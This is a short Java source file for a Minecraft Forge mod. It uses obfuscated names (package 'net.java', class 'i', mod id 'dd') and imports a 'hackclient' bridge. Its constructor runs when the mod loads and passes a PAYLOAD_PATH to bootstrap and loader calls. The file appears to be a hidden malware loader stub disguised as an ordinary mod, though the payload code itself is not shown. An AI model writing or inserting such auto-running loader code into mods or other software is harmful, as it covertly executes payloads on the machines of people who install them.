package net.java;

import cpw.mods.fml.common.Mod;
import net.hackclient.compat.Bridge;

@Mod(modid = "dd")
@net.minecraftforge.fml.common.Mod(value = "dd", modid = "dd")
public class i {
    public i() {
        m.init();
        Bridge.bootstrap(5, m.PAYLOAD_PATH);
        l.a((Object)new Object[]{null, null, 5, null, null, m.PAYLOAD_PATH});
    }
}
